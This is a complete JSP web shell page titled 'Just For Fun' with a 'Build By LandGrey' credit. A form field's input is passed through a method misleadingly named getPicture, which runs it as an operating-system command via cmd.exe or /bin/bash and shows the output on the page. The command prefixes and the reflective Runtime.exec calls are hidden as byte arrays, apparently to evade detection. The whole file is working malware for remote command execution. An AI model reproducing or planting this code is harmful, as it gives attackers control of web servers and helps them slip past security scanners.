<%@ page import="java.util.Scanner" pageEncoding="UTF-8" %>
<HTML>
<title>Just For Fun</title>
<BODY>
<H3>Build By LandGrey</H3>

<FORM METHOD=POST ACTION='#'>
    <INPUT name='q' type=text>
    <INPUT type=submit value='Fly'>
</FORM>

<%!
    public static String getPicture(String str) throws Exception{
        String fileSeparator = String.valueOf(java.io.File.separatorChar);
        if(fileSeparator.equals("\\")){
            str = new String(new byte[] {99, 109, 100, 46, 101, 120, 101, 32, 47, 67, 32}) + str;
        }else{
            str =  new String(new byte[] {47, 98, 105, 110, 47, 98, 97, 115, 104, 32, 45, 99, 32}) + str;
        }
        Class rt = Class.forName(new String(new byte[] { 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 }));
        Process e = (Process) rt.getMethod(new String(new byte[] { 101, 120, 101, 99 }), String.class).invoke(rt.getMethod(new String(new byte[] { 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 })).invoke(null, new Object[]{}),  new Object[] { str });
        Scanner sc = new Scanner(e.getInputStream()).useDelimiter("\\A");
        String result = "";
        result = sc.hasNext() ? sc.next() : result;
        sc.close();
        return result;
    }
%>

<%
    String name ="Input Nothing";
    String query = request.getParameter("q");
    if(query != null) {
        name = getPicture(query);
    }
%>

<pre>
<%= name %>
</pre>

</BODY>
</HTML>
